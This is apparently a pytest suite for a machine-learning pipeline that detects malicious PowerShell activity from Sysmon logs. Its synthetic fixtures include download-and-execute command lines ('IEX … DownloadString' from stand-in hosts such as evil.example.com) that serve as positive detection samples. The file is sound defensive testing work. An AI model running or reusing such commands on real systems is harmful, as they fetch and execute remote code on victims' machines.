"""
tests/test_pipeline.py
─────────────────────────────────────────────────────────────────────────────
Unit tests for each pipeline stage using synthetic in-memory data.
Run with:  python -m pytest tests/ -v

No network access or real data required — everything uses synthetic records.
"""

import json
import math
import pytest
import numpy as np
import pandas as pd
from pathlib import Path
from datetime import datetime, timezone, timedelta

# ─────────────────────────────────────────────────────────────────────────────
# Synthetic data factory
# ─────────────────────────────────────────────────────────────────────────────

def make_event(
    event_id: int = 1,
    pid: int = 1000,
    ppid: int = 500,
    image: str = "powershell.exe",
    parent_image: str = "explorer.exe",
    command_line: str = "powershell.exe -NoP -W Hidden -Enc ABCD1234==",
    integrity_level: str = "High",
    label: int = 1,
    family: str = "test_family",
    ttps: list = None,
    ts_offset_secs: float = 0.0,
) -> dict:
    base_ts = datetime(2024, 6, 1, 12, 0, 0, tzinfo=timezone.utc)
    return {
        "event_id":        event_id,
        "timestamp":       base_ts + timedelta(seconds=ts_offset_secs),
        "pid":             pid,
        "ppid":            ppid,
        "image":           image,
        "parent_image":    parent_image,
        "command_line":    command_line,
        "user":            "TESTDOM\\attacker",
        "integrity_level": integrity_level,
        "hostname":        "TEST-HOST",
        "source_file":     "test_source.json",
        "family":          family,
        "ttps":            ttps or ["T1059.001", "T1027"],
        "label":           label,
        "session_id":      "sess_000001",
    }


def make_session_df(n_procs: int = 4, malicious: bool = True) -> pd.DataFrame:
    events = []
    base_cmd = (
        "powershell.exe -NoP -W Hidden -Enc ABCD1234== -ExecutionPolicy Bypass "
        "IEX (New-Object Net.WebClient).DownloadString('http://evil.example.com/payload.ps1')"
        if malicious else
        "powershell.exe Get-Service"
    )
    for i in range(n_procs):
        events.append(make_event(
            event_id       = 1,
            pid            = 1000 + i,
            ppid           = 1000 + i - 1 if i > 0 else 500,
            image          = "powershell.exe",
            parent_image   = "powershell.exe" if i > 0 else "winword.exe",
            command_line   = base_cmd,
            integrity_level = "High" if malicious else "Medium",
            label          = int(malicious),
            ts_offset_secs = float(i * 5),
        ))
    # Add a network event
    if malicious:
        events.append(make_event(
            event_id  = 3,
            pid       = 1001,
            ppid      = 1000,
            image     = "powershell.exe",
            label     = 1,
            ts_offset_secs = 10.0,
        ))
    df = pd.DataFrame(events)
    df["session_id"] = "sess_000001"
    return df


# ─────────────────────────────────────────────────────────────────────────────
# Tests: Sysmon parser
# ─────────────────────────────────────────────────────────────────────────────

class TestSysmonParser:
    def test_otrf_record_parses(self):
        from src.ingestion.parse_sysmon import _parse_otrf_record
        rec = {
            "EventID": "1",
            "UtcTime": "2024-06-01 12:00:00.000",
            "ProcessId": "1000",
            "ParentProcessId": "500",
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "ParentImage": "C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE",
            "CommandLine": "powershell.exe -NoP -Enc ABCD==",
            "User": "DOMAIN\\user",
            "IntegrityLevel": "High",
            "Computer": "TEST-PC",
        }
        result = _parse_otrf_record(rec)
        assert result is not None
        assert result["image"] == "powershell.exe"
        assert result["parent_image"] == "winword.exe"
        assert result["event_id"] == 1
        assert result["pid"] == 1000
        assert result["ppid"] == 500

    def test_irrelevant_event_id_returns_none(self):
        from src.ingestion.parse_sysmon import _parse_otrf_record
        rec = {"EventID": "4688"}  # Windows Security log event, not Sysmon
        assert _parse_otrf_record(rec) is None

    def test_splunk_record_parses(self):
        from src.ingestion.parse_sysmon import _parse_splunk_record
        rec = {
            "EventCode": "1",
            "_time":     "2024-06-01 12:00:00",
            "ProcessId": "2000",
            "ParentProcessId": "1500",
            "Image":     "powershell.exe",
            "ParentImage": "services.exe",
            "CommandLine": "powershell.exe -w hidden",
            "User":      "NT AUTHORITY\\SYSTEM",
            "IntegrityLevel": "System",
            "ComputerName": "CORP-WS01",
        }
        result = _parse_splunk_record(rec)
        assert result is not None
        assert result["event_id"] == 1
        assert result["user_is_system"] if "user_is_system" in result else True  # feature check later

    def test_session_assignment(self):
        from src.ingestion.parse_sysmon import assign_sessions
        df = make_session_df(4, malicious=True)
        # Remove pre-assigned session_id to test the function
        df = df.drop(columns=["session_id"])
        result = assign_sessions(df, gap_secs=300)
        assert "session_id" in result.columns
        assert result["session_id"].nunique() >= 1


# ─────────────────────────────────────────────────────────────────────────────
# Tests: Tabular features
# ─────────────────────────────────────────────────────────────────────────────

class TestTabularFeatures:
    def test_extract_event_features_malicious(self):
        from src.features.tabular import extract_event_features
        row = pd.Series({
            "command_line": (
                "powershell.exe -NoP -W Hidden -Enc ABCD1234== "
                "-ExecutionPolicy Bypass IEX (New-Object Net.WebClient)"
                ".DownloadString('http://evil.com/ps.ps1')"
            ),
            "image":           "powershell.exe",
            "parent_image":    "winword.exe",
            "integrity_level": "High",
        })
        feats = extract_event_features(row)
        assert feats["has_encoded_arg"]     == 1
        assert feats["has_noprofile"]       == 1
        assert feats["has_hidden_window"]   == 1
        assert feats["has_bypass"]          == 1
        assert feats["has_iex"]             == 1
        assert feats["has_downloadstring"]  == 1
        assert feats["parent_is_office"]    == 1
        assert feats["user_is_high"]        == 1
        assert feats["entropy_score"]       >  0

    def test_extract_event_features_benign(self):
        from src.features.tabular import extract_event_features
        row = pd.Series({
            "command_line":    "powershell.exe Get-Service",
            "image":           "powershell.exe",
            "parent_image":    "explorer.exe",
            "integrity_level": "Medium",
        })
        feats = extract_event_features(row)
        assert feats["has_encoded_arg"]  == 0
        assert feats["has_iex"]          == 0
        assert feats["has_bypass"]       == 0
        assert feats["parent_is_office"] == 0

    def test_session_features_shape(self):
        from src.features.tabular import build_tabular_features
        df = make_session_df(4, malicious=True)
        result = build_tabular_features(df)
        assert len(result) == 1
        assert "label" in result.columns
        assert "session_event_count" in result.columns
        assert "entropy_score" in result.columns

    def test_session_features_malicious_signals(self):
        from src.features.tabular import build_tabular_features
        df = make_session_df(4, malicious=True)
        result = build_tabular_features(df)
        row = result.iloc[0]
        assert row["has_encoded_arg"]   == 1
        assert row["has_bypass"]        == 1
        assert row["has_downloadstring"] == 1
        assert row["has_network_call"]  == 1

    def test_entropy_calculation(self):
        from src.features.tabular import _shannon_entropy
        # Uniform string has high entropy
        high = _shannon_entropy("abcdefghijklmnopqrstuvwxyz")
        # Repeated character has zero entropy
        low  = _shannon_entropy("aaaaaaaaaa")
        assert high > 4.0
        assert low  == 0.0

    def test_no_nan_in_output(self):
        from src.features.tabular import build_tabular_features
        df = make_session_df(3, malicious=False)
        result = build_tabular_features(df)
        numeric = result.select_dtypes(include=[np.number])
        assert not numeric.isnull().any().any(), "NaN found in tabular features"


# ─────────────────────────────────────────────────────────────────────────────
# Tests: Graph builder
# ─────────────────────────────────────────────────────────────────────────────

class TestGraphBuilder:
    def test_graph_shape(self):
        pytest.importorskip("torch")
        from src.graph.builder import build_session_graph
        df = make_session_df(4, malicious=True)
        g  = build_session_graph(df)
        assert g is not None
        assert g.x.shape[1] == 18          # 18 node features
        assert g.edge_index.shape[0] == 2  # [src, dst]
        assert g.y.item() == 1             # malicious label

    def test_benign_graph(self):
        pytest.importorskip("torch")
        from src.graph.builder import build_session_graph
        df = make_session_df(3, malicious=False)
        g  = build_session_graph(df)
        if g is not None:
            assert g.y.item() == 0

    def test_small_session_returns_none(self):
        pytest.importorskip("torch")
        from src.graph.builder import build_session_graph
        df = make_session_df(1, malicious=True)
        g  = build_session_graph(df)
        assert g is None   # single node — no edges possible

    def test_node_features_in_range(self):
        pytest.importorskip("torch")
        from src.graph.builder import build_session_graph
        df = make_session_df(4, malicious=True)
        g  = build_session_graph(df)
        assert g is not None
        # Binary features (indices 0,1,3,4,5,8,9,10,16,17) should be 0 or 1
        binary_idx = [0, 1, 3, 4, 5, 8, 9, 10, 16, 17]
        x = g.x.numpy()
        for i in binary_idx:
            col = x[:, i]
            assert ((col == 0) | (col == 1)).all(), f"Feature {i} out of binary range"


# ─────────────────────────────────────────────────────────────────────────────
# Tests: Labeller
# ─────────────────────────────────────────────────────────────────────────────

class TestLabeller:
    def _make_tabular_df(self) -> pd.DataFrame:
        from src.features.tabular import build_tabular_features
        df_mal = make_session_df(4, malicious=True)
        df_ben = make_session_df(4, malicious=False)
        df_ben["session_id"] = "sess_000002"
        df_ben["label"]      = 0
        combined = pd.concat([df_mal, df_ben], ignore_index=True)
        return build_tabular_features(combined)

    def test_label_sessions(self):
        from src.labels.labeller import label_sessions
        tab = self._make_tabular_df()
        labelled = label_sessions(tab, min_events=2)
        assert "ttp_chain" in labelled.columns
        assert "confidence" in labelled.columns
        assert labelled["label"].isin([0, 1]).all()

    def test_ttp_chain_for_malicious(self):
        from src.labels.labeller import label_sessions
        tab = self._make_tabular_df()
        labelled = label_sessions(tab, min_events=2)
        mal = labelled[labelled["label"] == 1]
        assert not mal.empty
        # Every malicious session should have a non-empty TTP chain
        chains = mal["ttp_chain"].apply(
            lambda x: json.loads(x) if isinstance(x, str) else x
        )
        assert chains.apply(len).min() > 0

    def test_split_dataset(self):
        from src.labels.labeller import label_sessions, split_dataset
        # Build a larger synthetic dataset for splitting
        records = []
        for i in range(60):
            records.append({
                "session_id": f"sess_{i:06d}",
                "label":      int(i < 20),
                "family":     "empire_mimikatz_extract_keys" if i < 5 else "other",
                "ttps":       json.dumps(["T1059.001"]),
                "ttp_chain":  json.dumps([]),
                "confidence": 1.0,
                "session_event_count": 5,
            })
        df = pd.DataFrame(records)
        splits = split_dataset(
            df,
            train_frac   = 0.7,
            val_frac     = 0.1,
            test_frac    = 0.2,
            ood_families = ["empire_mimikatz_extract_keys"],
            random_seed  = 42,
        )
        assert "train" in splits
        assert "ood"   in splits
        assert len(splits["ood"]) == 5
        total_iid = len(splits["train"]) + len(splits["val"]) + len(splits["test"])
        assert total_iid == 55  # 60 - 5 OOD

    def test_build_ttp_chain_ordering(self):
        from src.labels.labeller import build_ttp_chain
        # T1003.001 (Cred Access, stage 6) should come after T1059.001 (Exec, stage 2)
        chain = build_ttp_chain(["T1003.001", "T1059.001"])
        stages = [c["stage"] for c in chain]
        assert stages == sorted(stages)


# ─────────────────────────────────────────────────────────────────────────────
# Run
# ─────────────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    import subprocess, sys
    subprocess.run([sys.executable, "-m", "pytest", __file__, "-v"])
